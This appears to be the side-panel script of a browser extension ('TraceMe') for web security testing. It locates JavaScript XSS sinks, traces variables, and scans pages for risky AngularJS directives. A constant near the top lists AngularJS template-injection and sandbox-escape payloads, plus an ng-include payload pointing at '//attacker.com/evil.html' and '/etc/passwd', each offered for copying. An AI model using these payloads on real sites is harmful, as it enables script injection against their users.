// ============================================================
// SHARED STATE & ELEMENTS
// ============================================================
const appContainer = document.querySelector('.app-container');
let currentScripts = [], allScripts = [], currentCode = '', currentUrl = '', ast = null;
let lastState = { url: '', line: 0 }, visitedScripts = [];
let angularData = null;

const ANGULAR_PAYLOADS = {
  TEMPLATE: [
    "{{1+1}}",
    "{{$on.constructor('alert(1)')()}}",
    "{{$eval.constructor('alert(1)')()}}",
    "{{$root.constructor.constructor('alert(1)')()}}",
    "{{toString.constructor.prototype.toString=toString.constructor.prototype.call;[\"a\",\"alert(1)\"].sort(toString.constructor)}}"
  ],
  EVENT: [
    "$event.view.alert(1)",
    "alert(1)",
    "$eval('alert(1)')"
  ],
  INIT: [
    "a=alert(1)",
    "constructor.constructor('alert(1)')()"
  ],
  INCLUDE: [
    "'/etc/passwd'",
    "'//attacker.com/evil.html'"
  ]
};

const $ = id => document.getElementById(id);
const sinkRegexInput = $('sink-regex'), scriptSelector = $('script-selector');
const sinkList = $('sink-list'), sinkCountBadge = $('sink-count');
const codeViewer = $('code-viewer'), scriptNameDisplay = $('script-name-display');
const viewerPanel = $('viewer-panel'), closeViewerBtn = $('close-viewer');
const refreshBtn = $('refresh-btn');
const tracePanel = $('trace-panel'), traceList = $('trace-list');
const traceTarget = $('trace-target'), liveValueEl = $('live-value');
const closeTraceBtn = $('close-trace');

function switchTab(tabName) {
  document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
  document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
  const btn = document.querySelector(`.tab-btn[data-tab="${tabName}"]`);
  if (btn) btn.classList.add('active');
  const tabEl = $('tab-' + tabName);
  if (tabEl) tabEl.classList.add('active');
}

// ============================================================
// TAB SWITCHING
// ============================================================
document.querySelectorAll('.tab-btn').forEach(btn => {
  btn.addEventListener('click', () => {
    switchTab(btn.dataset.tab);
    if (btn.dataset.tab === 'angular-recon') loadAngularData();
  });
});

// Collapsible severity sections
document.querySelectorAll('.severity-header').forEach(header => {
  header.addEventListener('click', () => {
    header.closest('.severity-section').classList.toggle('collapsed');
  });
});

// ============================================================
// INIT & LISTENERS
// ============================================================
async function init() {
  const state = await chrome.storage.local.get(['lastUrl', 'lastLine', 'visitedScripts']);
  lastState = { url: state.lastUrl || '', line: state.lastLine || 0 };
  visitedScripts = state.visitedScripts || [];
  refreshScripts();
}

chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
  if (changeInfo.status === 'complete' && tab.active) refreshScripts();
});
chrome.tabs.onActivated.addListener(() => refreshScripts());
refreshBtn.addEventListener('click', () => {
  refreshScripts();
  const activeTab = document.querySelector('.tab-btn.active');
  if (activeTab && activeTab.dataset.tab === 'angular-recon') loadAngularData();
});
sinkRegexInput.addEventListener('input', filterScripts);

// ============================================================
// JS ANALYZER (existing logic)
// ============================================================
async function refreshScripts(retryCount = 0) {
  const [tab] = await chrome.tabs.query({ active: true, currentWindow: true });
  if (!tab || !tab.id || !tab.url || tab.url.startsWith('chrome://')) { updateScriptSelector(); return; }
  try {
    const response = await chrome.tabs.sendMessage(tab.id, { type: 'GET_SCRIPTS' });
    if (response) {
      currentUrl = response.url;
      scriptSelector.innerHTML = '<option value="">Loading & analyzing scripts...</option>';
      const scriptsWithContent = await Promise.all(response.scripts.map(async (script) => {
        if (script.type === 'external') {
          try {
            const res = await chrome.runtime.sendMessage({ type: 'FETCH_EXTERNAL_SCRIPT', url: script.url });
            return { ...script, content: res.content || '' };
          } catch (e) { return { ...script, content: '' }; }
        }
        return script;
      }));
      allScripts = scriptsWithContent;
      filterScripts();
    }
  } catch (error) {
    if (retryCount < 5) setTimeout(() => refreshScripts(retryCount + 1), 500);
    else updateScriptSelector();
  }
}

function filterScripts() {
  let regex;
  try { regex = new RegExp(sinkRegexInput.value); } catch (e) { return; }
  currentScripts = allScripts.filter(s => regex.test(s.content));
  updateScriptSelector();
  chrome.action.setBadgeText({ text: currentScripts.length.toString() });
  chrome.action.setBadgeBackgroundColor({ color: '#7000ff' });
}

function updateScriptSelector() {
  scriptSelector.innerHTML = '<option value="">-- Select a Script --</option>';
  currentScripts.forEach((script, index) => {
    const option = document.createElement('option');
    option.value = script.id;
    const isVisited = visitedScripts.includes(script.url);
    let domain = 'Unknown';
    try { domain = new URL(script.type === 'inline' ? currentUrl : script.url).hostname; } catch (e) { domain = 'Local'; }
    if (script.type === 'external') {
      option.textContent = `${isVisited ? '✓ ' : ''}JS: ${script.url.split('/').pop() || script.url} (${domain})`;
    } else {
      option.textContent = `${isVisited ? '✓ ' : ''}Inline Script #${index + 1} (${domain})`;
    }
    scriptSelector.appendChild(option);
  });
  if (currentScripts.length > 0) {
    const targetUrl = lastState.url || currentScripts[0].url;
    const scriptToLoad = currentScripts.find(s => s.url === targetUrl) || currentScripts[0];
    if (!currentCode || (scriptToLoad && scriptToLoad.url !== currentUrl)) {
      scriptSelector.value = scriptToLoad.id;
      loadScript(scriptToLoad.id, lastState.line);
      lastState.line = 0;
    }
  }
}

async function loadScript(scriptId, targetLine = 0) {
  const script = currentScripts.find(s => s.id === scriptId);
  if (!script) return;
  chrome.storage.local.set({ lastUrl: script.url });
  if (!visitedScripts.includes(script.url)) {
    visitedScripts.push(script.url);
    chrome.storage.local.set({ visitedScripts });
    updateScriptSelector();
    scriptSelector.value = scriptId;
  }
  currentCode = js_beautify(script.content, { indent_size: 2, space_in_empty_paren: true });
  displayCode(currentCode, script.type === 'external' ? script.url : 'Inline Script', 'javascript');
  if (targetLine) goToLine(targetLine);
}

async function loadPageHtml(targetLine = 0) {
  const [tab] = await chrome.tabs.query({ active: true, currentWindow: true });
  if (!tab || !tab.id) return;
  
  try {
    const response = await chrome.tabs.sendMessage(tab.id, { type: 'GET_PAGE_HTML' });
    if (response && response.html) {
      displayCode(response.html, tab.url || 'Page Source', 'markup');
      if (targetLine) goToLine(targetLine);
    }
  } catch (e) {}
}

scriptSelector.addEventListener('change', (e) => { if (e.target.value) loadScript(e.target.value); });

function displayCode(code, name, lang = 'javascript') {
  currentCode = code;
  viewerPanel.classList.remove('hidden');
  scriptNameDisplay.textContent = lang === 'javascript' ? 'Script Viewer' : 'HTML Viewer';
  $('viewer-url-bar').textContent = name;
  
  if (lang === 'javascript') {
    try { ast = acorn.parse(code, { ecmaVersion: 'latest', sourceType: 'module' }); }
    catch (e) { try { ast = acorn.parse(code, { ecmaVersion: 'latest', sourceType: 'script' }); } catch (e2) { ast = null; } }
  } else {
    ast = null;
  }
  
  renderCodeWithHighlights(code, lang);
  if (lang === 'javascript') findSinks(code);
}

function renderCodeWithHighlights(code, lang = 'javascript') {
  codeViewer.innerHTML = '';
  const highlightedCode = Prism.highlight(code, Prism.languages[lang] || Prism.languages.javascript, lang);
  const lines = highlightedCode.split('\n');
  const regex = lang === 'javascript' ? new RegExp(sinkRegexInput.value, 'g') : null;
  
  lines.forEach((line, index) => {
    const lineDiv = document.createElement('div');
    lineDiv.className = 'code-line';
    lineDiv.id = `line-${index + 1}`;
    const temp = document.createElement('div');
    temp.innerHTML = line || ' ';
    
    if (lang === 'javascript' && regex) {
      temp.querySelectorAll('.token').forEach(token => {
        if (token.textContent.match(regex)) token.classList.add('highlight-sink');
        const isExcluded = token.classList.contains('keyword') || token.classList.contains('string') || token.classList.contains('comment') || token.classList.contains('operator') || token.classList.contains('punctuation');
        if (!isExcluded && !token.classList.contains('property')) token.classList.add('clickable-variable');
      });
      const walker = document.createTreeWalker(temp, NodeFilter.SHOW_TEXT, null, false);
      let textNode; const nodesToReplace = [];
      while (textNode = walker.nextNode()) { if (!textNode.parentElement.classList.contains('token')) nodesToReplace.push(textNode); }
      nodesToReplace.forEach(node => {
        const newSpan = document.createElement('span');
        newSpan.innerHTML = node.nodeValue.replace(/[a-zA-Z0-9_$]+/g, (match) => {
          if (match.match(regex)) return `<span class="token highlight-sink">${match}</span>`;
          return `<span class="clickable-variable">${match}</span>`;
        });
        node.parentNode.replaceChild(newSpan, node);
      });
    }
    
    lineDiv.innerHTML = temp.innerHTML;
    codeViewer.appendChild(lineDiv);
  });
}

codeViewer.addEventListener('click', (e) => {
  const target = e.target.closest('.clickable-variable');
  if (target) handleVariableClick(target.textContent, target);
});

function findSinks(code) {
  const regex = new RegExp(sinkRegexInput.value, 'g');
  const lines = code.split('\n');
  const sinks = [];
  lines.forEach((line, index) => {
    let match;
    while ((match = regex.exec(line)) !== null) {
      sinks.push({ func: match[0], line: index + 1, content: line.trim().substring(0, 50) + '...' });
    }
  });
  renderSinks(sinks);
}

function renderSinks(sinks) {
  sinkList.innerHTML = '';
  sinkCountBadge.textContent = sinks.length;
  sinks.forEach(sink => {
    const li = document.createElement('li');
    li.className = 'sink-item';
    li.innerHTML = `<span class="sink-func">${sink.func}</span><span class="sink-line">Line ${sink.line}: ${escapeHtml(sink.content)}</span>`;
    li.onclick = () => { 
      viewerPanel.classList.remove('hidden');
      clearLineHighlights(); 
      const el = $(`line-${sink.line}`); 
      if (el) { 
        el.scrollIntoView({ behavior: 'smooth', block: 'center' }); 
        el.classList.add('active-line-sink'); 
      } 
    };
    sinkList.appendChild(li);
  });
}

function handleVariableClick(word) {
  if (!ast) return;
  const refs = []; let definition = null;
  acorn.walk.simple(ast, {
    Identifier(node) { if (node.name === word) refs.push(node); },
    VariableDeclarator(node) { if (node.id.type === 'Identifier' && node.id.name === word) definition = node.id; },
    FunctionDeclaration(node) { if (node.id && node.id.name === word) definition = node.id; },
    ClassDeclaration(node) { if (node.id && node.id.name === word) definition = node.id; }
  });
  showTraceResults(word, definition, refs);
}

function showTraceResults(word, def, refs) {
  traceTarget.textContent = word;
  traceList.innerHTML = '';
  let defLine = null;
  if (def) {
    defLine = getLineNumber(def.start);
    const li = document.createElement('li');
    li.className = 'trace-item';
    li.innerHTML = `<strong>Definition:</strong> Line ${defLine}`;
    li.onclick = (e) => { document.querySelectorAll('.trace-item.active').forEach(el => el.classList.remove('active')); e.currentTarget.classList.add('visited', 'active'); goToLine(defLine); };
    traceList.appendChild(li);
  }
  const uniqueLines = new Set();
  refs.forEach(ref => { const line = getLineNumber(ref.start); if (def && line === getLineNumber(def.start)) return; uniqueLines.add(line); });
  uniqueLines.forEach(line => {
    const li = document.createElement('li');
    li.className = 'trace-item';
    li.textContent = `Reference: Line ${line}`;
    li.onclick = (e) => { document.querySelectorAll('.trace-item.active').forEach(el => el.classList.remove('active')); e.currentTarget.classList.add('visited', 'active'); goToLine(line); };
    traceList.appendChild(li);
  });
  tracePanel.classList.remove('hidden');
  appContainer.classList.add('tracing-active');
  highlightTracedWord(word);
  updateLiveValue(word);
  if (defLine) goToLine(defLine);
}

function highlightTracedWord(word) {
  document.querySelectorAll('.traced-variable-highlight').forEach(el => el.classList.remove('traced-variable-highlight'));
  document.querySelectorAll('.clickable-variable').forEach(el => { if (el.textContent === word) el.classList.add('traced-variable-highlight'); });
}

async function updateLiveValue(word) {
  liveValueEl.textContent = 'Fetching...'; liveValueEl.title = '';
  try {
    const [tab] = await chrome.tabs.query({ active: true, currentWindow: true });
    if (!tab || !tab.id) { liveValueEl.textContent = 'N/A'; return; }
    chrome.scripting.executeScript({
      target: { tabId: tab.id }, world: 'MAIN',
      func: (varName) => { try { let val = window[varName]; if (val === undefined) try { val = eval(varName); } catch(e) {} if (val === undefined) return 'undefined'; if (val === null) return 'null'; if (typeof val === 'function') return '[Function]'; if (typeof val === 'object') { try { return JSON.stringify(val).substring(0, 100); } catch(e) { return '[Object]'; } } return String(val); } catch (e) { return 'N/A'; } },
      args: [word]
    }, (results) => {
      if (chrome.runtime.lastError || !results || !results[0]) { liveValueEl.textContent = 'N/A'; return; }
      liveValueEl.textContent = results[0].result; liveValueEl.title = results[0].result;
    });
  } catch (err) { liveValueEl.textContent = 'N/A'; }
}

function getLineNumber(offset) { return currentCode.substring(0, offset).split('\n').length; }
function clearLineHighlights() { document.querySelectorAll('.active-line-trace, .active-line-sink').forEach(el => el.classList.remove('active-line-trace', 'active-line-sink')); }
function clearAllHighlights() { clearLineHighlights(); document.querySelectorAll('.traced-variable-highlight').forEach(el => el.classList.remove('traced-variable-highlight')); }
function goToLine(line) { clearLineHighlights(); const el = $(`line-${line}`); if (el) { el.scrollIntoView({ behavior: 'smooth', block: 'center' }); el.classList.add('active-line-trace'); chrome.storage.local.set({ lastLine: line }); } }
closeTraceBtn.onclick = () => { tracePanel.classList.add('hidden'); appContainer.classList.remove('tracing-active'); clearAllHighlights(); };
closeViewerBtn.onclick = () => { viewerPanel.classList.add('hidden'); };
function escapeHtml(text) { const div = document.createElement('div'); div.textContent = text; return div.innerHTML; }

// Resizer
const resizer = $('trace-resizer');
resizer.addEventListener('mousedown', (e) => { e.preventDefault(); document.addEventListener('mousemove', handleMouseMove); document.addEventListener('mouseup', handleMouseUp); });
function handleMouseMove(e) { const h = window.innerHeight - e.clientY; if (h > 100 && h < window.innerHeight * 0.8) tracePanel.style.height = `${h}px`; }
function handleMouseUp() { document.removeEventListener('mousemove', handleMouseMove); document.removeEventListener('mouseup', handleMouseUp); }

// ============================================================
// ANGULAR RECON TAB
// ============================================================
async function loadAngularData() {
  const statusIcon = $('angular-status-icon');
  const statusText = $('angular-status-text');
  const versionEl = $('angular-version');
  const totalEl = $('angular-total-count');
  const emptyEl = $('angular-empty');
  const tabBadge = $('angular-tab-badge');

  statusIcon.textContent = '⏳'; statusText.textContent = 'Scanning...';
  versionEl.textContent = ''; totalEl.textContent = '';

  const [tab] = await chrome.tabs.query({ active: true, currentWindow: true });
  if (!tab || !tab.id || !tab.url || tab.url.startsWith('chrome://')) {
    showAngularEmpty(); return;
  }

  try {
    const data = await chrome.tabs.sendMessage(tab.id, { type: 'GET_ANGULAR_DATA' });
    angularData = data;

    if (!data || !data.detected) { showAngularEmpty(); return; }

    // Header
    const sevColors = { HIGH: '#ff2e63', MEDIUM: '#ff9f43', LOW: '#ffd32a' };
    statusIcon.textContent = data.summary.maxSeverity === 'HIGH' ? '🔴' : data.summary.maxSeverity === 'MEDIUM' ? '🟠' : '🟡';
    statusText.textContent = 'ANGULAR DETECTED';
    statusText.style.color = sevColors[data.summary.maxSeverity];
    if (data.version) versionEl.textContent = `v${data.version}`;
    totalEl.textContent = `Findings: ${data.summary.total}`;

    // Tab badge
    tabBadge.textContent = data.summary.total;
    tabBadge.classList.remove('hidden');
    tabBadge.style.background = sevColors[data.summary.maxSeverity];

    // Hide empty, show sections
    emptyEl.classList.remove('visible');
    document.querySelectorAll('.severity-section').forEach(s => s.style.display = '');

    // Render sections
    renderDirectiveSection('high', data.directives.filter(d => d.severity === 'HIGH'));
    renderDirectiveSection('medium', data.directives.filter(d => d.severity === 'MEDIUM'));
    renderDirectiveSection('low', data.directives.filter(d => d.severity === 'LOW'));
    renderExpressions(data.expressions);
    renderScopePatterns(data.scopePatterns);
    renderConnections(data.connections);

  } catch (err) {
    console.error('[TraceMe] Angular load error:', err);
    showAngularEmpty();
  }
}

function showAngularEmpty() {
  $('angular-status-icon').textContent = '⚪';
  $('angular-status-text').textContent = 'NO ANGULAR DETECTED';
  $('angular-status-text').style.color = '';
  $('angular-version').textContent = '';
  $('angular-total-count').textContent = '';
  $('angular-tab-badge').classList.add('hidden');
  $('angular-empty').classList.add('visible');
  document.querySelectorAll('.severity-section').forEach(s => s.style.display = 'none');
}

function renderDirectiveSection(level, directives) {
  const list = $(`list-${level}`);
  const count = $(`count-${level}`);
  const section = $(`section-${level}`);
  list.innerHTML = '';
  count.textContent = directives.length;
  section.style.display = directives.length ? '' : 'none';

  // Group by directive name
  const groups = {};
  directives.forEach(d => {
    if (!groups[d.directive]) groups[d.directive] = [];
    groups[d.directive].push(d);
  });

  Object.entries(groups).forEach(([name, items]) => {
    if (items.length === 1) {
      const d = items[0];
      const li = document.createElement('li');
      li.className = 'finding-item';
      li.innerHTML = `
        <div class="finding-name">${escapeHtml(name)} ${d.lineEstimate ? `<span class="finding-location">line ${d.lineEstimate}</span>` : ''}</div>
        ${d.value ? `<div class="finding-value">└─ value: <span class="traceable-val">${escapeHtml(d.value)}</span></div>` : ''}
        ${d.element ? `<div class="finding-meta">&lt;${d.element.tag}&gt;${d.element.id ? ' #' + d.element.id : ''}${d.element.classes ? ' .' + d.element.classes : ''}</div>` : ''}
        <div class="payload-actions">
          <button class="payload-toggle-btn" data-directive="${escapeHtml(name)}">Suggested Payloads</button>
          ${d.value ? `<button class="trace-var-btn" data-var="${escapeHtml(d.value)}">Trace</button>` : ''}
        </div>
        <div class="payload-list hidden" id="payloads-${level}-${escapeHtml(name)}"></div>
      `;
      
      const toggleBtn = li.querySelector('.payload-toggle-btn');
      toggleBtn.onclick = (e) => {
        e.stopPropagation();
        const list = li.querySelector('.payload-list');
        if (list.innerHTML === '') {
          renderPayloadList(list, name);
        }
        list.classList.toggle('hidden');
      };

      const traceBtn = li.querySelector('.trace-var-btn');
      if (traceBtn) {
        traceBtn.onclick = (e) => {
          e.stopPropagation();
          const varName = d.value.split(/[. (]/)[0]; // Simple var extraction
          switchTab('js-analyzer');
          handleVariableClick(varName);
        };
      }
      
      li.onclick = () => {
        highlightInPage(d);
        if (d.lineEstimate) loadPageHtml(d.lineEstimate);
      };
      list.appendChild(li);
    } else {
      const li = document.createElement('li');
      li.className = 'finding-item';
      li.innerHTML = `<div class="finding-name">${escapeHtml(name)} <span class="finding-location">${items.length} instances</span></div>`;
      items.slice(0, 5).forEach(d => {
        const sub = document.createElement('div');
        sub.className = 'finding-value';
        sub.textContent = `├─ ${d.value || '(no value)'} ${d.lineEstimate ? `(line ${d.lineEstimate})` : ''}`;
        sub.style.cursor = 'pointer';
        sub.onclick = (e) => { e.stopPropagation(); highlightInPage(d); };
        li.appendChild(sub);
      });
      
      const payloadActions = document.createElement('div');
      payloadActions.className = 'payload-actions';
      payloadActions.innerHTML = `
        <button class="payload-toggle-btn">Suggested Payloads</button>
      `;
      const payloadList = document.createElement('div');
      payloadList.className = 'payload-list hidden';
      
      payloadActions.querySelector('.payload-toggle-btn').onclick = (e) => {
        e.stopPropagation();
        if (payloadList.innerHTML === '') renderPayloadList(payloadList, name);
        payloadList.classList.toggle('hidden');
      };

      li.appendChild(payloadActions);
      li.appendChild(payloadList);

      if (items.length > 5) {
        const more = document.createElement('div');
        more.className = 'finding-meta';
        more.textContent = `└─ ...and ${items.length - 5} more`;
        li.appendChild(more);
      }
      list.appendChild(li);
    }
  });
}

function renderPayloadList(container, directiveName) {
  let category = 'TEMPLATE';
  if (directiveName.match(/ng-(click|submit|mouse|key|change|blur|focus)/)) category = 'EVENT';
  else if (directiveName === 'ng-init') category = 'INIT';
  else if (directiveName === 'ng-include') category = 'INCLUDE';
  else if (directiveName === 'ng-app' || directiveName === 'ng-bind' || directiveName === 'ng-bind-html') category = 'TEMPLATE';

  const payloads = ANGULAR_PAYLOADS[category] || ANGULAR_PAYLOADS.TEMPLATE;
  
  payloads.forEach(p => {
    const item = document.createElement('div');
    item.className = 'payload-item';
    item.innerHTML = `
      <code>${escapeHtml(p)}</code>
      <button class="copy-payload-btn" title="Copy payload">
        <svg viewBox="0 0 24 24" width="12" height="12"><path fill="currentColor" d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"/></svg>
      </button>
    `;
    item.querySelector('.copy-payload-btn').onclick = async (e) => {
      e.stopPropagation();
      await navigator.clipboard.writeText(p);
      const btn = item.querySelector('.copy-payload-btn');
      btn.innerHTML = '<span style="color: #4cd137">✓</span>';
      setTimeout(() => {
        btn.innerHTML = '<svg viewBox="0 0 24 24" width="12" height="12"><path fill="currentColor" d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"/></svg>';
      }, 1500);
    };
    container.appendChild(item);
  });
}

function renderExpressions(expressions) {
  const list = $('list-expressions');
  const count = $('count-expressions');
  const section = $('section-expressions');
  list.innerHTML = '';
  count.textContent = expressions.length;
  section.style.display = expressions.length ? '' : 'none';

  expressions.forEach(expr => {
    const li = document.createElement('li');
    li.className = 'finding-item';
    const flags = [];
    if (expr.containsFunctionCall) flags.push('fn()');
    if (expr.containsFilter) flags.push('filter');
    li.innerHTML = `<div class="finding-name">${escapeHtml(expr.full)}${flags.length ? ` <span class="finding-location">${flags.join(', ')}</span>` : ''}</div><div class="finding-meta">in &lt;${expr.parentElement}&gt;</div><div class="payload-actions"><button class="trace-var-btn" data-var="${escapeHtml(expr.inner)}">Trace</button></div>`;
    
    li.querySelector('.trace-var-btn').onclick = (e) => {
      e.stopPropagation();
      const varName = expr.inner.trim().split(/[. (]/)[0];
      switchTab('js-analyzer');
      handleVariableClick(varName);
    };

    li.onclick = () => {
        // Highlight logic for expressions could be added to content.js if needed
        // For now, just load HTML and scroll
        loadPageHtml(); // Add estimated line if possible
    };
    
    list.appendChild(li);
  });
}

function renderScopePatterns(patterns) {
  const list = $('list-scope');
  const count = $('count-scope');
  const section = $('section-scope');
  list.innerHTML = '';
  count.textContent = patterns.length;
  section.style.display = patterns.length ? '' : 'none';

  // Group by pattern
  const groups = {};
  patterns.forEach(p => {
    if (!groups[p.pattern]) groups[p.pattern] = [];
    groups[p.pattern].push(p);
  });

  Object.entries(groups).forEach(([name, items]) => {
    const li = document.createElement('li');
    li.className = 'finding-item';
    const sevIcon = items[0].severity === 'HIGH' ? '🔴' : items[0].severity === 'MEDIUM' ? '🟠' : '🟡';
    li.innerHTML = `<div class="finding-name">${sevIcon} ${escapeHtml(name)} <span class="finding-location">found ${items.length}x</span></div>`;
    items.forEach(p => {
      const sub = document.createElement('div');
      sub.className = 'finding-value';
      sub.style.cursor = 'pointer';
      sub.style.padding = '4px 8px';
      sub.style.borderRadius = '4px';
      sub.style.marginTop = '2px';
      sub.textContent = `├─ Line ${p.line}: ${p.context.substring(0, 80)}...`;
      
      sub.onmouseenter = () => sub.style.background = 'rgba(255,255,255,0.05)';
      sub.onmouseleave = () => sub.style.background = '';
      
      sub.onclick = (e) => {
        e.stopPropagation();
        const scriptId = p.scriptSource.replace('inline-script-', 'inline-');
        switchTab('js-analyzer');
        loadScript(scriptId, p.line);
      };
      li.appendChild(sub);
    });
    list.appendChild(li);
  });
}

function renderConnections(connections) {
  const list = $('list-connections');
  const count = $('count-connections');
  const section = $('section-connections');
  list.innerHTML = '';
  count.textContent = connections.length;
  section.style.display = connections.length ? '' : 'none';

  connections.forEach(conn => {
    const li = document.createElement('li');
    li.className = 'finding-item';
    li.innerHTML = `<div class="finding-name">?${escapeHtml(conn.urlParam)} <span class="connection-arrow">→</span> ${escapeHtml(conn.directive)}="${escapeHtml(conn.directiveValue)}"</div><div class="finding-meta">&lt;${conn.element}&gt;${conn.elementId ? ' #' + conn.elementId : ''}</div>`;
    li.onclick = () => highlightInPage({ directive: conn.directive, value: conn.directiveValue });
    list.appendChild(li);
  });
}

async function highlightInPage(data) {
  try {
    const [tab] = await chrome.tabs.query({ active: true, currentWindow: true });
    if (tab && tab.id) chrome.tabs.sendMessage(tab.id, { type: 'HIGHLIGHT_ELEMENT', data });
  } catch (e) {}
}

// ============================================================
// ANGULAR ACTION BUTTONS
// ============================================================
$('btn-copy-all').addEventListener('click', async () => {
  if (!angularData || !angularData.detected) return;
  const text = formatAngularReport(angularData);
  await navigator.clipboard.writeText(text);
  const btn = $('btn-copy-all');
  btn.classList.add('copied');
  btn.querySelector('svg + *') || (btn.lastChild.textContent = '✓ Copied');
  setTimeout(() => { btn.classList.remove('copied'); btn.lastChild.textContent = ' Copy All'; }, 2000);
});

$('btn-export-json').addEventListener('click', () => {
  if (!angularData || !angularData.detected) return;
  const blob = new Blob([JSON.stringify(angularData, null, 2)], { type: 'application/json' });
  const url = URL.createObjectURL(blob);
  const a = document.createElement('a');
  a.href = url; a.download = `traceme-angular-${new Date().toISOString().slice(0, 10)}.json`;
  a.click(); URL.revokeObjectURL(url);
});

$('btn-rescan').addEventListener('click', () => loadAngularData());

function formatAngularReport(data) {
  let report = `=== TraceMe Angular Recon Report ===\nURL: ${currentUrl}\nVersion: ${data.version || 'Unknown'}\nTotal Findings: ${data.summary.total}\n\n`;
  report += `--- HIGH RISK (${data.summary.high}) ---\n`;
  data.directives.filter(d => d.severity === 'HIGH').forEach(d => { report += `  ${d.directive} = "${d.value}" (line ~${d.lineEstimate || '?'})\n`; });
  report += `\n--- MEDIUM RISK (${data.summary.medium}) ---\n`;
  data.directives.filter(d => d.severity === 'MEDIUM').forEach(d => { report += `  ${d.directive} = "${d.value}" (line ~${d.lineEstimate || '?'})\n`; });
  report += `\n--- LOW RISK (${data.summary.low}) ---\n`;
  data.directives.filter(d => d.severity === 'LOW').forEach(d => { report += `  ${d.directive} = "${d.value}" (line ~${d.lineEstimate || '?'})\n`; });
  report += `\n--- EXPRESSIONS (${data.summary.expressionCount}) ---\n`;
  data.expressions.forEach(e => { report += `  ${e.full} (in <${e.parentElement}>)\n`; });
  report += `\n--- SCOPE/SERVICE ACCESS (${data.summary.scopeCount}) ---\n`;
  data.scopePatterns.forEach(p => { report += `  ${p.pattern} (${p.scriptSource}, line ${p.line})\n    ${p.context}\n`; });
  report += `\n--- CONNECTED INPUTS (${data.summary.connectionCount}) ---\n`;
  data.connections.forEach(c => { report += `  ?${c.urlParam}=${c.urlValue} → ${c.directive}="${c.directiveValue}"\n`; });
  return report;
}

// ============================================================
// BOOT
// ============================================================
init();
